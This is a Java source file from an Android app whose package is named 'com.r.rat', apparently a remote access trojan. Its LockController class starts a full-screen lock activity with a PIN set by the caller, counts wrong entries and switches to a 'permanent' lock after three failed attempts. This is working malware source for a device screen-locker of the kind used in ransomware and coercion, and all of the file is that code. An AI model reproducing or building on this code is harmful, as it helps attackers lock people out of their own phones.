package com.r.rat;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
public class LockController {
    public static void lock(Context c, String pin) {
        SharedPreferences p = c.getSharedPreferences("lock", Context.MODE_PRIVATE);
        p.edit().putString("pin", pin).putInt("attempts", 0)
                .putBoolean("perm", false).putBoolean("active", true).apply();
        Intent i = new Intent(c, LockActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        c.startActivity(i);
    }
    public static void unlock(Context c) {
        c.getSharedPreferences("lock", Context.MODE_PRIVATE)
                .edit().putBoolean("active", false).apply();
        c.sendBroadcast(new Intent("com.r.rat.UNLOCK"));
        LockActivity.finishGlobal();
    }
    public static void permanentUnlock(Context c) {
        c.getSharedPreferences("lock", Context.MODE_PRIVATE)
                .edit().putBoolean("perm", false).putInt("attempts", 0)
                .putBoolean("active", false).apply();
        LockActivity.clearPermanent();
        LockActivity.finishGlobal();
    }
    public static boolean checkPin(Context c, String input) {
        return input.equals(c.getSharedPreferences("lock", Context.MODE_PRIVATE)
                .getString("pin", ""));
    }
    public static int incrementAttempt(Context c) {
        SharedPreferences p = c.getSharedPreferences("lock", Context.MODE_PRIVATE);
        int a = p.getInt("attempts", 0) + 1;
        SharedPreferences.Editor e = p.edit().putInt("attempts", a);
        if (a >= 3) e.putBoolean("perm", true);
        e.apply();
        return a;
    }
}